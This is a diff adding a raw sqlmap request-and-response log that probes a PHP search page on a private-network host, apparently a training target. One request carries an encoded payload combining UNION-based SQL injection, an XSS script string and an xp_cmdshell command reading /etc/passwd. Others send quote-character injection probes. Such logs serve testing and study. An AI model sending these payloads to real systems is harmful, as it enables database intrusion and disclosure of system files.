@@ -1,0 +1,140 @@
+HTTP request [#1]:
+POST /functions_external/sqli4.php HTTP/1.1
+Cache-Control: no-cache
+User-Agent: sqlmap/1.10.1.2#dev (https://sqlmap.org)
+Host: 192.168.25.165:8000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 21
+Connection: close
+
+name=&difficulty=None
+
+HTTP response [#1] (200 OK):
+Date: Mon, 05 Jan 2026 08:03:54 GMT
+Server: Apache/2.4.56 (Debian)
+X-Powered-By: PHP/8.0.30
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 73
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://192.168.25.165:8000/functions_external/sqli4.php
+
+Search: , password<br>Query feedback: NO<br>Exception feedback: NO<br>
+
+############################################################################
+
+HTTP request [#2]:
+POST /functions_external/sqli4.php?BEgS=4604%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
+Cache-Control: no-cache
+User-Agent: sqlmap/1.10.1.2#dev (https://sqlmap.org)
+Host: 192.168.25.165:8000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 21
+Connection: close
+
+name=&difficulty=None
+
+HTTP response [#2] (200 OK):
+Date: Mon, 05 Jan 2026 08:03:54 GMT
+Server: Apache/2.4.56 (Debian)
+X-Powered-By: PHP/8.0.30
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 73
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://192.168.25.165:8000/functions_external/sqli4.php?BEgS=4604%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
+
+Search: , password<br>Query feedback: NO<br>Exception feedback: NO<br>
+
+############################################################################
+
+HTTP request [#3]:
+POST /functions_external/sqli4.php HTTP/1.1
+Cache-Control: no-cache
+User-Agent: sqlmap/1.10.1.2#dev (https://sqlmap.org)
+Host: 192.168.25.165:8000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 21
+Connection: close
+
+name=&difficulty=None
+
+HTTP response [#3] (200 OK):
+Date: Mon, 05 Jan 2026 08:03:55 GMT
+Server: Apache/2.4.56 (Debian)
+X-Powered-By: PHP/8.0.30
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 73
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://192.168.25.165:8000/functions_external/sqli4.php
+
+Search: , password<br>Query feedback: NO<br>Exception feedback: NO<br>
+
+############################################################################
+
+HTTP request [#4]:
+POST /functions_external/sqli4.php HTTP/1.1
+Cache-Control: no-cache
+User-Agent: sqlmap/1.10.1.2#dev (https://sqlmap.org)
+Host: 192.168.25.165:8000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 62
+Connection: close
+
+name=&difficulty=%4E%6F%6E%65%5C%28%2C%29%2E%28%2C%27%2C%22%2C
+
+HTTP response [#4] (200 OK):
+Date: Mon, 05 Jan 2026 08:03:55 GMT
+Server: Apache/2.4.56 (Debian)
+X-Powered-By: PHP/8.0.30
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 73
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://192.168.25.165:8000/functions_external/sqli4.php
+
+Search: , password<br>Query feedback: NO<br>Exception feedback: NO<br>
+
+############################################################################
+
+HTTP request [#5]:
+POST /functions_external/sqli4.php HTTP/1.1
+Cache-Control: no-cache
+User-Agent: sqlmap/1.10.1.2#dev (https://sqlmap.org)
+Host: 192.168.25.165:8000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 83
+Connection: close
+
+name=&difficulty=%4E%6F%6E%65%5C%27%52%4F%6C%70%52%6C%3C%27%22%3E%79%77%47%6A%5A%46
+
+HTTP response [#5] (200 OK):
+Date: Mon, 05 Jan 2026 08:03:55 GMT
+Server: Apache/2.4.56 (Debian)
+X-Powered-By: PHP/8.0.30
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 73
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://192.168.25.165:8000/functions_external/sqli4.php
+
+Search: , password<br>Query feedback: NO<br>Exception feedback: NO<br>
+
+############################################################################
+
